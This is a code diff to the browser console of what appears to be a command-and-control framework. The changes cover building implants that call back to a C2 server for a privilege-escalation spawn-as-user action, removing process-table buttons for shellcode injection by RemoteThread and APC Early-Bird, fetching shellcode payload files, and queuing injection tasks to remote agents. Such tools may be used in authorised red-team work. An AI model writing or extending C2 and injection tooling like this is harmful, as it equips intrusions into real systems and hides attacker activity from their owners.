@@ -4801,7 +4801,6 @@ async function runCtxAction(act) {
         const fmtDate = s => { try { return new Date(s).toLocaleDateString(undefined,{month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'}); } catch(_){return '';} };
         const payloadItems  = [
             {v:'', l:'🆕 Build new (auto)'},
-            {v:'self', l:'♻️ Reuse current binary (self) — no disk write'},
           ]
           .concat(artifacts.map(f=>({v:f.filename, l:`${f.filename}${f.opsec ? ' · OPSEC' : ''}${f.lang ? ` · ${f.lang}` : ''}  (${fmtDate(f.created_at)})`})))
           .concat(uploadFiles.filter(f=>!artifactNames.has(f.filename) && isAgentPayloadFilename(f.filename)).map(f=>({v:f.filename,l:f.filename})));
@@ -4876,11 +4875,13 @@ async function runCtxAction(act) {
               const scheme    = transport === 'tcp' ? 'tcp' : transport;
               const serverURL = `${scheme}://${c2host}:${portMap[transport]||'8080'}`;
               addConsoleOutputForAgent(aid, `[privesc] Building ${outName} → ${serverURL}…`, '', null);
+              // The C agent is reliable as an elevated/service process, but
+              // its startup path is not compatible with a restricted RunAs
+              // token.  Use the Go implementation for this specific local
+              // spawn so the new session can register as the supplied user.
+              const childLang = agnt?.language === 'c' ? 'go' : preferredLang(transport, agnt?.language);
               const buildR = await api('POST', '/api/build', {
-                // Spawn-as-user must preserve the implementation language of
-                // the selected parent.  Falling back only to localStorage
-                // silently built a Go child for C/Nim/Rust parents.
-                lang: preferredLang(transport, agnt?.language), format:'exe', transport, server_url: serverURL,
+                lang: childLang, format:'exe', transport, server_url: serverURL,
                 sleep_sec: agnt?.sleep_sec||5, jitter_pct: agnt?.jitter_pct??10,
                 parent_id: aid, parent_ip: host,
                 output_name: outName,
@@ -5425,8 +5426,6 @@ async function refreshProcessList() {
 
 function renderProcessTableJSON(wrap, procs) {
   if (!procs.length) { wrap.innerHTML = '<div style="padding:20px;color:var(--text3)">No processes found</div>'; return; }
-  const psAgent = agents.find(a => a.id === psAgentId);
-  const psIsWin = isWindowsAgent(psAgent);
   const secFilter = (document.getElementById('ps-filter-input')?.value || '').toLowerCase().trim();
   const shown = secFilter ? procs.filter(p => p.name.toLowerCase().includes(secFilter) || (p.security||'').toLowerCase().includes(secFilter)) : procs;
   let rows = '';
@@ -5434,11 +5433,7 @@ function renderProcessTableJSON(wrap, procs) {
     const secBadge = p.security ? `<span style="background:rgba(232,48,48,.18);color:#e83030;padding:1px 6px;border-radius:3px;font-size:10px;margin-left:6px">${esc(p.security)}</span>` : '';
     rows += `<tr style="border-bottom:1px solid var(--border)" oncontextmenu="processContextMenu(event,${p.pid},'${p.name.replace(/'/g,"\\'")}');return false" title="Right-click for actions">
       <td style="padding:4px 10px;font-family:var(--font-mono);font-size:11px;color:var(--text3);width:60px">${p.pid}</td>
-      <td style="padding:4px 6px;font-size:12px">${esc(p.name)}${secBadge}</td>
-      <td style="padding:4px 10px;text-align:right;white-space:nowrap">
-        <button class="btn btn-ghost btn-sm" onclick="psKill(${p.pid})" title="Kill" style="color:var(--accent-red,#e06c75);font-size:10px">✕ Kill</button>
-        ${psIsWin ? `<button class="btn btn-ghost btn-sm" onclick="psInject(${p.pid},'${p.name.replace(/'/g,"\\'")}')" title="Inject" style="font-size:10px">⚡ Inject</button>` : ''}
-      </td></tr>`;
+      <td style="padding:4px 6px;font-size:12px">${esc(p.name)}${secBadge}</td></tr>`;
   }
   wrap.innerHTML = `<div style="padding:4px 10px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px">
     <input id="ps-filter-input" placeholder="Filter processes…" style="flex:1;max-width:260px;padding:3px 8px;background:var(--bg3);border:1px solid var(--border);border-radius:3px;color:var(--text);font-size:11px" oninput="renderProcessTableJSON(document.getElementById('ps-table-wrap'), _lastProcs)">
@@ -5449,26 +5444,9 @@ function renderProcessTableJSON(wrap, procs) {
   <table style="width:100%;border-collapse:collapse">
     <thead><tr style="background:var(--bg2);color:var(--text3);font-size:10px;text-transform:uppercase;letter-spacing:.8px">
       <th style="padding:5px 10px;text-align:left;width:60px">PID</th>
-      <th style="padding:5px 6px;text-align:left">Image</th>
-      <th style="padding:5px 10px;width:120px"></th></tr></thead>
+      <th style="padding:5px 6px;text-align:left">Image</th></tr></thead>
     <tbody>${rows}</tbody></table></div>`;
   window._lastProcs = procs;
-}
-
-async function psKill(pid) {
-  if (!psAgentId || !confirm(`Kill PID ${pid}?`)) return;
-  const ag = agents.find(a => a.id === psAgentId);
-  const isWin = isWindowsAgent(ag);
-  const killCmd = isWin ? `taskkill /F /PID ${pid}` : `kill -9 ${pid}`;
-  const r = await api('POST', `/api/agents/${psAgentId}/task`, {type:'SHELL', args:killCmd});
-  if (r?.ok) { toast(`Kill signal sent to PID ${pid}`); setTimeout(refreshProcessList, 1500); }
-}
-async function psInject(pid, name) {
-  if (!psAgentId) return;
-  showChoice(`Inject → ${name} (PID ${pid})`, 'Select injection method:', [
-    {label:'💉 Shellcode (RemoteThread)', onClick: () => openInjectModal(psAgentId, 'remote', String(pid))},
-    {label:'⚡ APC Early-Bird',           onClick: () => openInjectModal(psAgentId, 'apc',    String(pid))},
-  ]);
 }
 
 function closeProcessTab() { closePSSession(psAgentId); }
@@ -5896,8 +5874,11 @@ function agentContextMenu(e, agentId) {
 function processContextMenu(e, pid, name) {
   e.preventDefault();
   e.stopPropagation();
-  const aid = activeAgent?.id;
-  document.querySelectorAll('.ps-table tr').forEach(r => r.classList.remove('ctx-active'));
+  // Process List sessions are opened from Agents → Recon and use psAgentId;
+  // console `ps` output uses activeAgent. Prefer the explicit PS session so
+  // every action is sent to the agent whose process table is being viewed.
+  const aid = psAgentId || activeAgent?.id;
+  document.querySelectorAll('.ps-table tr, #ps-table-wrap tr').forEach(r => r.classList.remove('ctx-active'));
   e.currentTarget.classList.add('ctx-active');
   const label = pid + ' — ' + name;
   const ag = agents.find(a => a.id === aid);
@@ -9994,9 +9975,16 @@ function selectAgent(id, openConsole = true) {
 
 // ── Tabbed console ────────────────────────────────────────────────────────────
 
-function openConsoleFor(id) {
+function openConsoleFor(id, options = {}) {
   const a = agents.find(x => x.id === id);
   if (!a) return;
+
+  // Context-menu actions opened from Recon should not expose unrelated
+  // historical task output in the operator console.
+  if (options.fresh) {
+    consoleOutputs[id] = null;
+    consoleCleared.add(id);
+  }
 
   // Add tab if not already open
   if (!consoleTabs.includes(id)) {
@@ -12152,10 +12140,12 @@ function u8ToB64(u8) {
   return btoa(s);
 }
 
-// Fetch a shellcode/payload file: tries uploads first, then built artifacts.
+// Fetch a shellcode/payload file. Generated artifacts are authoritative when
+// an upload happens to reuse the same filename; otherwise an old upload can
+// silently replace the payload selected by the operator.
 async function fetchSCFile(name) {
   const h = {'Authorization': 'Bearer ' + TOKEN};
-  for (const url of [`${BASE}/api/dl/${encodeURIComponent(name)}`, `${BASE}/api/artifacts/${encodeURIComponent(name)}`]) {
+  for (const url of [`${BASE}/api/artifacts/${encodeURIComponent(name)}`, `${BASE}/api/dl/${encodeURIComponent(name)}`]) {
     const r = await fetch(url, {headers: h});
     if (r.ok) return new Uint8Array(await r.arrayBuffer());
   }
@@ -13598,12 +13588,13 @@ async function pollResult(taskID, agentID, timeoutMs = 120000, meta = {}) {
 }
 
 function addConsoleOutputForAgent(agentID, output, err, ts) {
+  // A new result supersedes a temporary clean-console request.
+  consoleCleared.delete(agentID);
   if (consoleShownAgentId === agentID) {
     addConsoleOutput(output, err, ts);
   } else {
     // Invalidate cached DOM so next switch to this tab reloads fresh from API
     consoleOutputs[agentID] = null;
-    consoleCleared.delete(agentID); // new output supersedes an explicit clear
   }
 }
 
@@ -17594,7 +17585,8 @@ async function injectWithFile(filename) {
     const r = await api('POST', `/api/agents/${agentId}/task`, {type, args:taskArgs, payload:b64});
     if (r?.ok) {
       toast(type + ' queued via ' + filename);
-      if (!activeAgent || activeAgent.id !== agentId) openConsoleFor(agentId);
+      const consoleVisible = document.getElementById('console-view')?.style.display !== 'none';
+      if (!consoleVisible || consoleShownAgentId !== agentId) openConsoleFor(agentId, {fresh:true});
       pollResult(r.data?.task_id, agentId);
     }
   } catch(e) { toast('Error: ' + e.message, 'red'); }
